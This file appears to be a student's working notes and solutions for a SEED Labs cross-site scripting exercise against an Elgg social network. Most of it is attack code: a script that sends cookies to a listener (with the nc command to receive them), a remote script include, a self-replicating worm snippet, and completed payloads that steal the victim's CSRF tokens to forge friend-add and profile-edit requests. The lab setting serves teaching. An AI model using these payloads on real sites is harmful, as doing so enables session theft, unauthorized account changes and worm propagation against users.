//1. XSS Attack
<script>alert('XSS');</script>

//2. Show Cookie
<script>alert(document.cookie);</script>

//3. Remote Javascript
<script	type="text/javascript" src="http://www.csrflabaccatker.com/myscripts.js"></script>

//4. Steal Cookies

<script>
window.onload = function(){
    console.log('Stealing Cookie .....');
    document.write('<img src=http://127.0.0.1:5555?c=' + escape(document.cookie) + ' >');
}
</script>

//Listen to Port 5555
//$ nc -l 5555 -v

//5. Skeleton for Task 1

<script type="text/javascript">
	window.onload = function () {
	var Ajax=null;
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;
	//Construct the HTTP request to add Samy as a friend.

	var sendurl=...; //FILL IN

	//Create and send Ajax request to add friend
	Ajax=new XMLHttpRequest();
	Ajax.open("GET",sendurl,true);
	Ajax.setRequestHeader("Host","www.xsslabelgg.com");
	Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
	Ajax.send();
	}
</script>

//6. Skeleton for Task 2
<script type="text/javascript">
	window.onload = function(){
	//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
	//and Security Token __elgg_token
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;
	//Construct the content of your url.
        var sendurl=...; //FILL IN
	var content=...; //FILL IN
	
	if(//Condition to check if the user is not Samy)
	{
		//Create and send Ajax request to modify profile
		var Ajax=null;
		Ajax=new XMLHttpRequest();
		Ajax.open("POST",sendurl,true);
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type",
		"application/x-www-form-urlencoded");
		Ajax.send(content);
	}
	}
</script>

//7. Hint for Task 3 
<script id=worm>
	var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
	var jsCode = document.getElementById("worm").innerHTML;
	var tailTag = "</" + "script>";
	var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
	alert(jsCode);
</script>


friend request url
http://www.xsslabelgg.com/action/friends/add?friend=47&__elgg_ts=1624196908&__elgg_token=qAKR-q_K4KSTtQP6tLqkAQ&__elgg_ts=1624196908&__elgg_token=qAKR-q_K4KSTtQP6tLqkAQ

remove friend url
http://www.xsslabelgg.com/action/friends/remove?friend=47&__elgg_ts=1624196908&__elgg_token=qAKR-q_K4KSTtQP6tLqkAQ&__elgg_ts=1624196908&__elgg_token=qAKR-q_K4KSTtQP6tLqkAQ


update profile post request url
http://www.xsslabelgg.com/action/profile/edit

update profile post content body


__elgg_token=FRqEDktMyWg6EkQjfKE9iA
&
__elgg_ts=1624253636
&
name=seed+ubuntu
&
description=%3Cp%3Eseed+ubuntu%3C%2Fp%3E%0D%0A
&
accesslevel%5Bdescription%5D=1
&
briefdescription=1605062
&
accesslevel%5Bbriefdescription%5D=1
&
location=seed+ubuntu
&
accesslevel%5Blocation%5D=1
&
interests=seed+ubuntu
&
accesslevel%5Binterests%5D=1
&
skills=seed+ubuntu
&
accesslevel%5Bskills%5D=1
&
contactemail=killmeh%40gmail.com
&
accesslevel%5Bcontactemail%5D=1
&
phone=seed+ubuntu
&
accesslevel%5Bphone%5D=1
&
mobile=seed+ubuntu
&
accesslevel%5Bmobile%5D=1
&
website=https%3A%2F%2Fwww.killmeh.com%2Fwebsite
&
accesslevel%5Bwebsite%5D=1
&
twitter=seed+ubuntu
&
accesslevel%5Btwitter%5D=1
&
guid=44





// solution 2


<script type="text/javascript">
	window.onload = function(){
		//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
		//and Security Token __elgg_token
		var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
		var token="&__elgg_token="+elgg.security.token.__elgg_token;
		var guid = "&guid="+elgg.session.user.guid;
		//Construct the content of your url.
		var sendurl="http://www.xsslabelgg.com/action/profile/edit"; //FILL IN
		var content=ts+token+"&name=seed+ubuntu&description=%3Cp%3Eseed+ubuntu%3C%2Fp%3E%0D%0A&accesslevel%5Bdescription%5D=1&briefdescription=1605062&accesslevel%5Bbriefdescription%5D=1&location=seed+ubuntu&accesslevel%5Blocation%5D=1&interests=seed+ubuntu&accesslevel%5Binterests%5D=1&skills=seed+ubuntu&accesslevel%5Bskills%5D=1&contactemail=killmeh%40gmail.com&accesslevel%5Bcontactemail%5D=1&phone=seed+ubuntu&accesslevel%5Bphone%5D=1&mobile=seed+ubuntu&accesslevel%5Bmobile%5D=1&website=https%3A%2F%2Fwww.killmeh.com%2Fwebsite&accesslevel%5Bwebsite%5D=1&twitter=seed+ubuntu&accesslevel%5Btwitter%5D=1"+guid //FILL IN
		//console.log(content);
		//console.log(elgg.session.user.guid!=elgg.page_owner.guid);
		if(elgg.session.user.guid!=elgg.page_owner.guid)
		{
		    //console.log('hi');
		    //console.log(content);
			//Create and send Ajax request to modify profile
			var Ajax=null;
			Ajax=new XMLHttpRequest();
			Ajax.open("POST",sendurl,true);
			Ajax.setRequestHeader("Host","www.xsslabelgg.com");
			Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
			Ajax.send(content);
		}
	}
</script>







// solution 1
<script type="text/javascript">
	window.onload = function () {
	//alert('XSS');
	var Ajax=null;
	//var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	//var token="&__elgg_token="+elgg.security.token.__elgg_token;
	//Construct the HTTP request to add Samy as a friend.
	var anchorLink = document.getElementsByClassName('elgg-button');
	var sendurl = anchorLink[1].getAttribute('href');
	//console.log(sendurl);
	
	if(elgg.session.user.guid!=elgg.page_owner.guid)
	{

		//Create and send Ajax request to add friend
		Ajax=new XMLHttpRequest();
		/*Ajax.onreadystatechange = function() {
				//if (xhr.readyState === 4) {
				 // callback(xhr.response);
				//}
				console.log(Ajax.readyState);
				console.log(Ajax.response);			
		}*/	
		Ajax.open("GET",sendurl,true);
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
		Ajax.send();
	}
	
}
</script>







